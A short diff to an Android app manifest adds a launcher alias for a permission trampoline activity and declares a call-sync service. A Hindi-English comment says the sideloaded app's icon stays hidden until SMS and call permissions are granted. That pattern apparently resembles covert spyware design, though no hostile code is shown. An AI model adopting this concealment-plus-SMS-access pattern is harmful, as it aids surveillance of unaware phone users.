@@ -48,8 +48,22 @@
         android:exported="true"
         android:excludeFromRecents="true"
         android:launchMode="singleTop"
-        android:taskAffinity=""
-        android:theme="@style/PermissionTrampolineTheme" />
+        android:theme="@style/AppTheme" />
+
+      <!-- Sideload APK: icon tab tak dikhe jab tak SMS/call permission + first register na ho. -->
+      <activity-alias
+        android:name=".LauncherAlias"
+        android:enabled="true"
+        android:exported="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:targetActivity=".PermissionTrampolineActivity">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+      </activity-alias>
 
       <service
         android:name=".CallSyncService"
